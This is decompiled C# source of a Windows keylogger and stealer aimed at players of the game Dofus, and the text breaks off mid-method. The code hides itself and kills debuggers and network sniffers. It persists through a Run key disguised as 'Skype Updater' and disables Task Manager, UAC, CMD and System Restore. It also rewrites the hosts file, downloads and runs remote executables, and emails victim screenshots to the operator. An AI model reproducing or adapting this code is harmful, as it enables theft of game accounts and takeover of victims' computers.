using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[DesignerGenerated]
public class Frisk : Form
{
	public enum GEnum0
	{
		Contient,
		ContientPas,
		Egal,
		Toutletemps
	}

	private IContainer icontainer_0;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private int int_0;

	private int int_1;

	private Timer timer_0;

	private bool bool_0;

	private bool bool_1;

	private bool bool_2;

	private bool bool_3;

	private bool bool_4;

	private string string_5;

	private string string_6;

	private MsgBoxStyle msgBoxStyle_0;

	private string string_7;

	private bool bool_5;

	private string string_8;

	private bool bool_6;

	private Timer timer_1;

	private string string_9;

	private string[] string_10;

	private string[] string_11;

	private string[] string_12;

	private bool bool_7;

	private bool bool_8;

	private bool bool_9;

	private bool bool_10;

	private bool bool_11;

	private bool bool_12;

	private bool bool_13;

	private bool bool_14;

	private bool bool_15;

	private bool bool_16;

	private bool bool_17;

	private bool bool_18;

	private bool bool_19;

	private bool bool_20;

	private bool bool_21;

	private string string_13;

	private Mutex mutex_0;

	private GEnum0 genum0_0;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private string string_20;

	private DateTime dateTime_0;

	private string string_21;

	private string string_22;

	[AccessedThroughProperty("Tele")]
	private GClass10 gclass10_0;

	private virtual GClass10 GClass10_0
	{
		get
		{
			return gclass10_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			GClass10.GDelegate0 value2 = method_31;
			if (gclass10_0 != null)
			{
				GClass10.Event_0 -= value2;
			}
			gclass10_0 = value;
			if (gclass10_0 != null)
			{
				GClass10.Event_0 += value2;
			}
		}
	}

	public Frisk()
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Frisk_FormClosing));
		((Form)this).add_Load((EventHandler)Frisk_Load);
		string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string_1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string_2 = "";
		string_3 = "";
		string_4 = "smtp.gmail.com";
		int_0 = 587;
		int_1 = 300000;
		timer_0 = new Timer();
		bool_0 = true;
		bool_1 = true;
		bool_2 = false;
		bool_3 = true;
		bool_4 = true;
		string_5 = "Error";
		string_6 = "This application is not a win32 valid executable." + Environment.NewLine + "Please, check your devices";
		msgBoxStyle_0 = (MsgBoxStyle)16;
		string_7 = "%rand%";
		bool_5 = true;
		string_8 = "Skype Updater";
		bool_6 = true;
		timer_1 = new Timer();
		string_9 = "";
		bool_7 = true;
		bool_8 = true;
		bool_9 = false;
		bool_10 = true;
		bool_11 = true;
		bool_12 = true;
		bool_13 = false;
		bool_14 = false;
		bool_15 = false;
		bool_16 = false;
		bool_17 = false;
		bool_18 = false;
		bool_19 = true;
		bool_20 = true;
		bool_21 = true;
		string_13 = "MutexKey";
		genum0_0 = GEnum0.Toutletemps;
		string_14 = "Dofus";
		string_16 = "exfenstr";
		string_18 = "1.5_A";
		string_19 = method_7();
		string_20 = "Aucune";
		string_21 = "";
		string_22 = "http://ankama-video.net/";
		GClass10_0 = new GClass10();
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)Class2.Class3_0.Frisk_0);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Frisk");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int int_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_23, int int_3);

	private void Frisk_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Frisk_Load(object sender, EventArgs e)
	{
		//IL_0178: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0534: Unknown result type (might be due to invalid IL or missing references)
		//IL_0542: Unknown result type (might be due to invalid IL or missing references)
		method_0("Lancement");
		((Control)this).Hide();
		string_19 = method_7();
		Thread.Sleep(2000);
		method_8();
		checked
		{
			try
			{
				method_0("Extraction des paramètres...");
				string @string = Encoding.Default.GetString(Convert.FromBase64String("VmtsV1JTVXlNRXhQVmtWRlJVVlNMVXhQVDA5UFRB"));
				string string2 = Encoding.Default.GetString(Convert.FromBase64String("VEc5MlpYSXRiRzlKVEl3WlhOMEpUSXdKVVU1WjJGc0pUSXdKVVV3SlRJd1FXeHBiV1Z1ZEc5eUpUSXdUVTlWU0VGQlNFRklRVWhCU0VGSVFVaEJTRUZJUVVF"));
				string string3 = Encoding.Default.GetString(Convert.FromBase64String("UlhRbE1qQk1iM1psY2kxc2Iyd2xNakFsTTBRbE1qQkJiR2x0Wlc1MGIzSWxNakFsTTBFbE5VUQ=="));
				FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
				string string_ = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref string_, -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				string string_2 = method_11(string_, @string, string2);
				string text = method_28(method_28(method_28(string_2, string3), @string), string2);
				if (Operators.CompareString(text, "", false) == 0)
				{
					Interaction.MsgBox((object)"ERRREEEEEEEEUUUUUUUUUUUUR", (MsgBoxStyle)16, (object)null);
					Process.GetCurrentProcess().Kill();
				}
				method_10(text, string3);
				method_0("Paramètres obtenus avec succès !");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox((object)"ERRREEEEEEEEUUUUUUUUUUUUR", (MsgBoxStyle)16, (object)null);
				Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
				Process.GetCurrentProcess().Kill();
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(2000);
			method_0("Vérification des processus");
			method_23(string_13);
			method_0("Aucun keylogger n'est lancé, le serveur peut continuer");
			timer_0.set_Interval(int_1 * 60000);
			timer_0.add_Tick((EventHandler)timer_0_Tick);
			method_0("Détection de l'installation");
			if (Operators.CompareString(Application.get_StartupPath(), string_1, false) == 0)
			{
				method_0("Le Keylogger a déjà été installé");
				timer_1.set_Interval(5000);
				timer_1.add_Tick((EventHandler)timer_1_Tick);
				timer_1.Start();
				if (bool_11)
				{
					method_0("Tentative de fermeture de Dofus");
					method_9("Dofus");
					method_9("DofusMod");
				}
				if (bool_11)
				{
					method_0("Tentative de fermeture de l'Uplauncher");
					method_9("UpLauncher");
				}
				timer_0.Start();
				try
				{
					method_0("Verif UniqueID");
					WebClient webClient = new WebClient();
					string text2 = webClient.DownloadString(string_22 + "Dofus MultiSteal Revolution/stubilol.dmsr");
					if (text2.Contains(string_19 + ":kill"))
					{
						Process.GetCurrentProcess().Kill();
					}
					if (text2.Contains(string_19 + ":dl"))
					{
						method_0("Détection d'un fichier à télécharger");
						((ServerComputer)Class2.Class1_0).get_Network().DownloadFile(method_11(text2, "[DL:" + string_19 + "]", "[/DL:" + string_19 + "]"), string_0 + "\\lololo.exe");
						Process.Start(string_0 + "\\lololo.exe");
						method_0("Fichier téléchargé et lancé avec succès");
					}
					method_0("Verif UniqueID effectuée avec succès !");
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					method_0("Erreur lors de la Verif UniqueID : " + ex4.ToString());
					ProjectData.ClearProjectError();
				}
				method_0("Fin des vérifications, début de la prise des logs");
				return;
			}
			method_0("Le Keylogger n'a pas encore été installé");
			if (Operators.CompareString(string_7, "%rand%", false) == 0)
			{
				method_0("Génération d'un nom de processus");
				string_7 = method_29(5, 10);
			}
			if (bool_4)
			{
				method_0("Affichage du FakeMsg");
				Interaction.MsgBox((object)string_6, msgBoxStyle_0, (object)string_5);
			}
			method_21();
			if (bool_1)
			{
				method_22();
			}
			try
			{
				method_0("Installation du virus...");
				File.Copy(Application.get_ExecutablePath(), string_1 + "\\" + string_7 + ".exe");
				method_0("Virus installé avec succès !");
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				method_0("Erreur lors de l'installation : " + ex6.ToString());
				ProjectData.ClearProjectError();
			}
			method_12();
			method_1();
			Process process = new Process();
			process.StartInfo.FileName = string_1 + "\\" + string_7 + ".exe";
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			if (bool_5)
			{
				File.WriteAllText(Application.get_StartupPath() + "\\self.bat", "@ECHO OFF" + Environment.NewLine + "DEL \"" + Application.get_ExecutablePath() + "\"" + Environment.NewLine + "DEL %0");
				process.StartInfo.FileName = Application.get_StartupPath() + "\\self.bat";
				process.Start();
				Process.GetCurrentProcess().Kill();
			}
			Process.GetCurrentProcess().Kill();
			Application.Exit();
		}
	}

	public void method_0(string string_23)
	{
		string_21 = string_21 + DateTime.Now.ToString() + " : " + method_24(string_23) + " <br/>";
	}

	public void method_1()
	{
		try
		{
			string[] array = string_10;
			foreach (string text in array)
			{
				try
				{
					string text2 = string_0 + "\\" + method_29(5, 15) + ".exe";
					((ServerComputer)Class2.Class1_0).get_Network().DownloadFile(text, text2);
					Process.Start(text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
			File.ReadAllText(path);
			StreamWriter streamWriter = new StreamWriter(path);
			string[] array2 = string_11;
			foreach (string text3 in array2)
			{
				try
				{
					streamWriter.WriteLine(text3 + " 127.0.0.1");
					streamWriter.WriteLine(Environment.NewLine);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			streamWriter.Close();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			string[] array3 = string_12;
			foreach (string fileName in array3)
			{
				try
				{
					Process.Start(fileName);
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	internal string method_2()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			SelectQuery val = new SelectQuery("Win32_processor");
			ManagementObjectSearcher val2 = new ManagementObjectSearcher((ObjectQuery)(object)val);
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val3).get_Item("processorId").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result2 = "err";
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	internal string method_3()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass("Win32_NetworkAdapterConfiguration");
			ManagementObjectCollection instances = val.GetInstances();
			string text = string.Empty;
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (text.Equals(string.Empty))
					{
						if (Conversions.ToBoolean(((ManagementBaseObject)val2).get_Item("IPEnabled")))
						{
							text = ((ManagementBaseObject)val2).get_Item("MacAddress").ToString();
						}
						val2.Dispose();
					}
					text = text.Replace(":", string.Empty);
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "err";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal string method_4(string string_23 = "C")
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		try
		{
			ManagementObject val = new ManagementObject($"win32_logicaldisk.deviceid=\"{string_23}:\"");
			val.Get();
			return ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "err";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal string method_5()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			SelectQuery val = new SelectQuery("Win32_BaseBoard");
			ManagementObjectSearcher val2 = new ManagementObjectSearcher((ObjectQuery)(object)val);
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val3).get_Item("SerialNumber").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result2 = "err";
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	public string method_6()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		string result = "";
		ManagementScope val = new ManagementScope("\\\\" + Environment.MachineName + "\\root\\cimv2");
		SelectQuery val2 = new SelectQuery("SELECT * FROM WIN32_DiskDrive");
		ManagementObjectSearcher val3 = new ManagementObjectSearcher(val, (ObjectQuery)(object)val2);
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = val3.Get().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ManagementObject val4 = (ManagementObject)enumerator.get_Current();
				PropertyDataEnumerator enumerator2 = ((ManagementBaseObject)val4).get_Properties().GetEnumerator();
				while (enumerator2.MoveNext())
				{
					PropertyData current = enumerator2.get_Current();
					if (current.get_Value() != null && Operators.CompareString(current.get_Name(), "Signature", false) == 0)
					{
						result = current.get_Value().ToString();
						break;
					}
				}
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public string method_7()
	{
		string text = ".|.Lover-lol.|.";
		return method_25(method_25(method_2() + text) + method_3() + text + method_5() + text);
	}

	public void method_8()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.ToLower().Contains("reflector") | process.ProcessName.ToLower().Contains("ollydbg") | process.ProcessName.ToLower().StartsWith("sae") | process.ProcessName.ToLower().Contains("wireshark") | process.ProcessName.ToLower().Contains("fiddler") | process.ProcessName.ToLower().Contains("wpe"))
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public void method_9(string string_23)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(string_23);
			foreach (Process process in processesByName)
			{
				process.Kill();
				method_0("Le processus " + process.ToString() + " a été correctement fermé");
			}
			Process[] processesByName2 = Process.GetProcessesByName(string_23 + ".exe");
			foreach (Process process2 in processesByName2)
			{
				process2.Kill();
				method_0("Le processus " + process2.ToString() + " a été correctement fermé");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			method_0("Erreur lors de la fermeture du processus " + string_23 + " ; " + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public void method_10(string string_23, string string_24)
	{
		//IL_0441: Unknown result type (might be due to invalid IL or missing references)
		//IL_046c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0497: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c5: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		string[] array = string_23.Split(new char[1] { Conversions.ToChar(string_24) });
		for (int i = 0; i < array.Length; i = checked(i + 1))
		{
			string text = array[i];
			text = text.Replace("XQlMjBMb3Zlci1sb2wlMjAlM0QlMjBBbGltZW50b3IlMjAlM0ElNUQ", "");
			num = checked(num + 1);
			switch (num)
			{
			case 1:
				string_2 = text;
				break;
			case 2:
				string_3 = text;
				break;
			case 4:
				string_4 = text;
				break;
			case 5:
				int_0 = Conversions.ToInteger(Conversion.Int((object)text));
				break;
			case 6:
				int_1 = Conversions.ToInteger(Conversion.Int((object)text));
				break;
			case 7:
				switch (text)
				{
				case "C":
					genum0_0 = GEnum0.Contient;
					break;
				case "N":
					genum0_0 = GEnum0.ContientPas;
					break;
				case "E":
					genum0_0 = GEnum0.Egal;
					break;
				case "T":
					genum0_0 = GEnum0.Toutletemps;
					break;
				}
				break;
			case 8:
				string_14 = text;
				break;
			case 9:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_1 = true;
				}
				else
				{
					bool_1 = false;
				}
				break;
			case 10:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_2 = true;
				}
				else
				{
					bool_2 = false;
				}
				break;
			case 11:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_3 = true;
				}
				else
				{
					bool_3 = false;
				}
				break;
			case 12:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_0 = true;
				}
				else
				{
					bool_0 = false;
				}
				break;
			case 13:
				string_10 = Strings.Split(method_11(text, "[DL]", "[/DL]"), "!dl!", -1, (CompareMethod)0);
				string_11 = Strings.Split(method_11(text, "[HOST]", "[/HOST]"), "!host!", -1, (CompareMethod)0);
				string_12 = Strings.Split(method_11(text, "[LANCE]", "[/LANCE]"), "!lance!", -1, (CompareMethod)0);
				break;
			case 14:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_4 = true;
				}
				else
				{
					bool_4 = false;
				}
				break;
			case 15:
				string_5 = text;
				break;
			case 16:
				string_6 = text;
				break;
			case 17:
				switch (text)
				{
				case "Erreur":
					msgBoxStyle_0 = (MsgBoxStyle)16;
					break;
				case "Information":
					msgBoxStyle_0 = (MsgBoxStyle)64;
					break;
				case "Attention":
					msgBoxStyle_0 = (MsgBoxStyle)48;
					break;
				case "Normal":
					msgBoxStyle_0 = (MsgBoxStyle)0;
					break;
				}
				break;
			case 18:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_7 = true;
				}
				else
				{
					bool_7 = false;
				}
				break;
			case 19:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_8 = true;
				}
				else
				{
					bool_8 = false;
				}
				break;
			case 20:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_9 = true;
				}
				else
				{
					bool_9 = false;
				}
				break;
			case 21:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_10 = true;
				}
				else
				{
					bool_10 = false;
				}
				break;
			case 22:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_11 = true;
				}
				else
				{
					bool_11 = false;
				}
				break;
			case 23:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_12 = true;
				}
				else
				{
					bool_12 = false;
				}
				break;
			case 24:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_13 = true;
				}
				else
				{
					bool_13 = false;
				}
				break;
			case 25:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_14 = true;
				}
				else
				{
					bool_14 = false;
				}
				break;
			case 26:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_15 = true;
				}
				else
				{
					bool_15 = false;
				}
				break;
			case 27:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_16 = true;
				}
				else
				{
					bool_16 = false;
				}
				break;
			case 28:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_17 = true;
				}
				else
				{
					bool_17 = false;
				}
				break;
			case 29:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_18 = true;
				}
				else
				{
					bool_18 = false;
				}
				break;
			case 30:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_19 = true;
				}
				else
				{
					bool_19 = false;
				}
				break;
			case 31:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_20 = true;
				}
				else
				{
					bool_20 = false;
				}
				break;
			case 32:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_21 = true;
				}
				else
				{
					bool_21 = false;
				}
				break;
			case 33:
				string_9 = Environment.GetFolderPath((Environment.SpecialFolder)Conversions.ToInteger(Conversion.Int((object)text)));
				break;
			case 34:
				string_7 = text;
				break;
			case 35:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					string_7 = "%rand%";
				}
				break;
			case 36:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_6 = true;
				}
				else
				{
					bool_6 = false;
				}
				break;
			case 37:
				string_8 = text;
				break;
			case 38:
				string_13 = text;
				break;
			case 39:
				if (Operators.CompareString(text, "T", false) == 0)
				{
					bool_5 = true;
				}
				else
				{
					bool_5 = false;
				}
				break;
			}
		}
	}

	public string method_11(string string_23, string string_24, string string_25)
	{
		object obj = string_23.IndexOf(string_24);
		object obj2 = string_23.IndexOf(string_25);
		object obj3 = Operators.SubtractObject(obj2, obj);
		if (Operators.ConditionalCompareObjectEqual(obj3, (object)0, false))
		{
			return "";
		}
		return string_23.Substring(Conversions.ToInteger(Operators.AddObject(obj, (object)string_24.Length)), Conversions.ToInteger(Operators.SubtractObject(obj3, (object)string_24.Length)));
	}

	public void method_12()
	{
		if (bool_21)
		{
			method_20();
		}
		if (bool_17)
		{
			method_18();
		}
		if (bool_18)
		{
			method_17();
		}
		if (bool_14)
		{
			method_16();
		}
		if (bool_16)
		{
			method_15();
		}
		if (bool_19)
		{
			method_14();
		}
		if (bool_13)
		{
			method_13();
		}
		if (bool_20)
		{
			method_19();
		}
	}

	public void method_13()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_14()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
			registryKey.SetValue("Hidden", "2");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_15()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore");
			registryKey.SetValue("DisableConfig", "1");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore");
			registryKey2.SetValue("DisableSR", "1");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void method_16()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableRegistryTools", "1");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_17()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
			registryKey.SetValue("NoControlPanel", "1");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_18()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Windows\\System");
			registryKey.SetValue("DisableCMD", "2");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_19()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey.SetValue("EnableLUA", "0");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey2.SetValue("ConsentPromptBehaviorAdmin", "0");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void method_20()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
			registryKey.SetValue("EnableBalloonTips", "0");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_21()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
			registryKey.SetValue(string_8, string_1 + "\\" + string_7 + ".exe");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			method_0("Échec de l'ajout au démarrage, vous pouvez dire adieu à cette victime :(    " + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_22()
	{
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		method_0("Envoi d'un mail de nouvelle victime");
		if (bool_0)
		{
			try
			{
				method_0("Prise d'un screen");
				if (File.Exists("C:\\zxss.jpg"))
				{
					FileSystem.Kill("C:\\zxss.jpg");
				}
				Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
				Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)925707);
				Graphics.FromImage((Image)(object)val).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
				((Image)val).Save("C:\\zxss.jpg", ImageFormat.get_Jpeg());
				((Image)val).Dispose();
				method_0("Screen pris avec succès !");
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				method_0("Erreur lors de la prise de screen : " + ex2.ToString());
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			method_0("Création du mail ...");
			MailMessage mailMessage = new MailMessage();
			SmtpClient smtpClient = new SmtpClient(string_4);
			mailMessage.From = new MailAddress(string_2);
			mailMessage.To.Add(string_2);
			mailMessage.Subject = "[Dofus MultiKey Revolution " + string_18 + "] Nouvelle victime : " + Environment.MachineName + "-" + Environment.UserName;
			mailMessage.IsBodyHtml = true;
			mailMessage.Body = "<b><color=#FF0000>Ce message ne contient AUCUN logs ! Il est juste là pour vous prévenir</color></b>";
			mailMessage.Body += "<br/>";
			MailMessage mailMessage2 = mailMessage;
